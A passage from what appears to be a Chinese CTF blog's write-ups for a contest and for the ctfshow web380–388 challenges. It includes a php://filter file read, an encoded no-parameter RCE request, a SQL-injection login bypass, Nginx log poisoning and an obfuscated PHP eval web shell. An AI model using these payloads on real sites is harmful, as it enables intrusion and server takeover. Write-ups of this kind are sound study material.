wsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsywsywsywswyswyswyswyswywsywwsywwswywswyswyswywsywsywsywwsywwyswsywsywsywsywsywsywyswsywsywwsywsywsywsywsywsywsywsywsyywsywswsy&amp;flag=php://filter/read=convert.base64-encode/resource=flag.php</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030918728.png?x-oss-process=hzy" alt="image-20220703091822688"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030918729.png?x-oss-process=hzy" alt="image-20220703091829686"></p>
<p>PCL{bc58644f-f757-11ec-9edf-5224002d2b29}</p>
<h1 id="简单的php">简单的php</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030920908.png?x-oss-process=hzy" alt="image-20220703092016853"></p>
<p>简单分析一下代码，是get传参，对传参内容长度加以限制，并且过滤了字母和数字，整体来看这题考察的是无参数rce</p>
<p>写了个脚本进行无参绕过</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030217752.gif?x-oss-process=hzy" alt="img"></p>
<p>通过绕过可以查看文件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030217755.gif?x-oss-process=hzy" alt="img"></p>
<p>最终在ua头修改内容为cat /ffffflaggg的情况下，实现无参rce，得到flag</p>
<pre><code class="hljs plaintext">POST /?code=[~%8C%86%8C%8B%9A%92][~%CF]([~%91%9A%87%8B][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]())); HTTP/1.1
Host: 192.168.1.111:8220
User-Agent: cat /ffffflaggg
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.111:8220
Connection: close
Referer: http://192.168.1.111:8220/?code=[~%8C%86%8C%8B%9A%92][!%FF]();
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Content-Length: 0</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030217767.gif?x-oss-process=hzy" alt="img"></p>
<p>PCL{b35a314f-ff57-13a2-9ad1-002d22deeb2a}</p>
<h1 id="总结">总结</h1>
<p>24小时的比赛最后定格九十名，还是太菜，继续努力吧</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030959071.png?x-oss-process=hzy" alt="image-20220703095958984"></p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>黑盒测试</title>
    <url>/2022/04/04/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>ctfshow里黑盒测试，记录一下！</p>
<span id="more"></span>
<h1 id="web380">web380</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/38d22d14d43244058447e450d5fcdf70.png?x-oss-process=hzy" alt="image-20220404194135955"></p>
<p>没啥突破口，扫一下！</p>
<p>扫描过程略过。。。。。。，结论就是扫到了page.php目录</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/1051c4e56934c0149712edb3c5f0db75.png?x-oss-process=hzy" alt="image-20220404195556692"></p>
<p>打开显示失败，但是看$id的参数应该存在文件包含！</p>
<blockquote>
<p>?id=flag</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/bb4c6ae37eb4ebbdcd504e1c174bfda0.png?x-oss-process=hzy" alt="image-20220404195731656"></p>
<h1 id="web381">web381</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/a0dd89100e3876a346cc7a65eee5451a.png?x-oss-process=hzy" alt="image-20220404201250537"></p>
<p>访问一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/e02274a212e3b65636512cce78b14839.png?x-oss-process=hzy" alt="image-20220404201433964"></p>
<h1 id="web382">web382</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/ef8e184669e20c267cec525f65565ecc.png?x-oss-process=hzy" alt="image-20220404201624665"></p>
<p>还是继续访问这个路径，是个登陆界面！</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/abe8dbb92e45b1e514b373dfaf2e0516.png?x-oss-process=hzy" alt="image-20220404201641326"></p>
<p>第一种解法就是万能密码登录</p>
<blockquote>
<p>eg：admin 'or ‘1’=‘1’#</p>
</blockquote>
<p>第二种当然就是用bp直接爆破！</p>
<p>第三种就是sqlmap跑</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/7f0b3c8922c760d5ec29f769393a1e31.png?x-oss-process=hzy" alt="image-20220404202319461"></p>
<h1 id="web383">web383</h1>
<p>和上题一样</p>
<h1 id="web384">web384</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/9ce62e1c2a89c042ad9b500374809c03.png?x-oss-process=hzy" alt="image-20220404202539262"></p>
<p>注意有提示，显然还是爆破</p>
<p>第一个变量-两位小写的英文字母</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/41a3a942ea787b1740431d404838803e.png?x-oss-process=hzy" alt="image-20211004205556975"></p>
<p>第二个变量-三位数字</p>
<p><img src="https://img.hzy2003628.top/41a3a942ea787b1740431d404838803e.png" alt="image-20211004205615785" style="zoom:200%;"><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/41a3a942ea787b1740431d404838803e.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/b5a2a3fec033aafbfa29f4afd4e097e0.png?x-oss-process=hzy" alt="image-20220404202701541"></p>
<h1 id="web385">web385</h1>
<p>得到提示访问install</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/444fc65602801d728806610539a8dabb.png?x-oss-process=hzy" alt="image-20220404203108262"></p>
<p>继续访问</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/c4e063f3dac52edd2520e710777ff7f2.png?x-oss-process=hzy" alt="image-20220404203133898"></p>
<p>然后继续后台登录，admin/admin888</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/116e971719b834e948590e266da0f7e6.png?x-oss-process=hzy" alt="image-20220404203219272"></p>
<h1 id="web386">web386</h1>
<p>依然存在install页面</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/7547da6bc9d0162aea930e33feec36c5.png?x-oss-process=hzy" alt="image-20220404203820083"></p>
<p>扫目录发现还存在clear.php页面</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/0086b1f133d4e92240786ecfe3b42bb6.png?x-oss-process=hzy" alt="image-20220404203916012"></p>
<p>清理完成，<code>/clear.php?file=install/lock.dat</code>继续访问install/?install,还是默认密码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/bd77755cde797e6a1c5b0f823cf1991e.png?x-oss-process=hzy" alt="image-20220404204127100"></p>
<h1 id="web387">web387</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/92a840ac98c144dc51cb781232626caa.png?x-oss-process=hzy" alt="image-20220404204156785"></p>
<p>扫目录可以发现有robots.txt</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/22c6edf3fb3b54e033ea8aa9253e80af.png?x-oss-process=hzy" alt="image-20220404204256731"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/f28a12c9dcf89e81030328b592af0971.png?x-oss-process=hzy" alt="image-20220404204309669"></p>
<p>提示文件不存在，需要换入file参数，这里重点来了，可以通过包含日志文件<code>/var/www/nginx/access.log,访问日志文件写入命令，访问的同时命令也就执行了</code>,然后再去访问生成的文件!</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/da2958c4371db520f2f41be9df497179.png?x-oss-process=hzy" alt="image-20220404205139558"></p>
<p>用bp写入吧</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/3ec0f48b6978e5614dedd2b02c38339a.png?x-oss-process=hzy" alt="image-20220404205522652"></p>
<p>然后访问<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/e5fa082c72129b1e533475eb5bd6b219.png?x-oss-process=hzy" alt="image-20220404205535056"></p>
<p>flag在alsckdfy/check.php，原理一样还是日志包含</p>
<blockquote>
<?php system('cat /var/www/html/alsckdfy/check.php > /var/www/html/2.txt');?>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/aca5c67aee66d690b99a7b4b56a95368.png?x-oss-process=hzy" alt="image-20220404205753756"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/23ffeab07be626fa8c78084c79ded91c.png?x-oss-process=hzy" alt="image-20220404205744312"></p>
<h1 id="web388">web388</h1>
<p>无回显加免杀马</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/0ab02b1407e9f2e68a93ad6e8e26236a.png?x-oss-process=hzy" alt="image-20220404205948098"></p>
<p>再次访问/var/www/html已经显示一句话</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/6714e3d7674b2ec85293cf142fec044d.png?x-oss-process=hzy" alt="image-20220404210034979"></p>
<p>扫目录的时候发现了/alsckdfy/editor/目录，访问一下，是md编辑器</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/d46f064f2086aadb35253319faba2786.png?x-oss-process=hzy" alt="image-20220404210146118"></p>
<p>发现可以上传图片以及压缩包！因为允许上传zip文件，所以写一句话然后把后缀改为zip!</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/1c01344d2b6aede312e4d63a06c19934.png?x-oss-process=hzy" alt="image-20220404210352256"></p>
<blockquote>
<?php
$a = '<?ph'.'p ev'.'al($_PO'.'ST[1]);?>';
<p>file_put_contents(‘/var/www/html/1.php’,$a);<br>
?&gt;</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/0d92e7bf256bc98708d827f9d8d7975a.png?x-oss-process=hzy" alt="image-20220404210524367"></p>
<p>并且给出了路径</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/15dda568c35d59902950ff18af8ad342.png?x-oss-process=hzy" alt="image-20220404210602498"></p>
<blockquote>
<p>这个时候再去执行包含文件/debug/?file=/var/www/html/alsckdfy/attached/file/20220404/20220404130517_39664.zip</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/be8a4caae2ebb448a1ef8d56ecba9e16.png?x-oss-process=hzy" alt="image-20220404210723022"></p>
<p>此时文件内容已经被读取写入日志了，再去包含日志文件<code>/debug/?file=/var/log/nginx/access.log</code>，写入的shell就执行了，生成1.php，访问执行拿到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/77f4dc502cfd7178f54809f07fce46ea.png?x-oss-process=hzy" alt="image-20211006174833010">这个时候去看日志就能得到flag！</p>
<p>还有一种方法，包含日志写入shell</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/2867648c9a73c04dd756327cfdddca12.png?x-oss-process=hzy" alt="image-20220404211432785">然后再访问一次<code>/debug/?file=/var/log/nginx/access.log</code>，就会生成shell</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/2867648c9a73c04dd756327cfdddca12.png?x-oss-process=hzy" alt="image-20211006180656898"></p>
<p>还有一种方法</p>
